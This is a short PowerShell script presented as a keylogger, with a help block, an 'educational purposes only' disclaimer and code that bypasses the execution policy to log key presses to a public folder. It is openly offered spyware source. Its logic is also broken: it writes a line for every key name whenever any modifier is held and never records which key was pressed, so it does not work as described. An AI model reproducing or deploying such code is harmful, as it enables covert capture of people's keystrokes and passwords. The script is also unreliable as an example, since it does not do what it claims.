<#
.SYNOPSIS
    A simple keylogger script that logs key presses to a specified file.

.DESCRIPTION
    This script sets the execution policy to bypass for the current session, 
    adds the necessary .NET assembly for Windows Forms, and logs key presses 
    to a specified file. It continuously checks for key presses and logs them 
    along with any modifier keys pressed.

.PARAMETER logfile
    The path to the file where key presses will be logged.

.NOTES
    Author: Gillen Reid
    This script is for educational purposes only. Unauthorized use of keyloggers 
    is illegal and unethical.

.EXAMPLE
    # Run the script
    .\keylogger.ps1

    # This will start logging key presses to C:\Users\Public\keylog.txt
#>
# Allow the script to run by bypassing the execution policy for this session
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

Add-Type -AssemblyName System.Windows.Forms

$logfile = "C:\Users\Public\keylog.txt"

$kbHook = [system.windows.forms.keys]

while ($true) {
    foreach ($key in [Enum]::GetValues($kbHook)) {
        if ([System.Windows.Forms.Control]::ModifierKeys -ne [System.Windows.Forms.Keys]::None) {
            Add-Content -Path $logfile -Value "$($key): Modifier Pressed"
        }
    }
    Start-Sleep -Milliseconds 100
}

Write-Output "Null" > $null 2>&1
